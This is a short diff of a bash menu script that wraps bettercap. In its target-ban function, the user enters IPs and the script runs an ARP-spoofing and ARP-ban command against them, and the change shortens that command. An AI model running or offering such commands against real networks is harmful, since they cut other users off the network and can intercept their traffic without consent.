@@ -133,7 +133,7 @@ BAN_TARGET() {
 	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
 			   read TARGETS
 		done
-	gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGETS; arp.spoof on; set arp.ban on; net.probe on" && clear; MENU_PRINCIPAL
+	gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGETS; arp.ban on" && clear; MENU_PRINCIPAL
 }
 
 
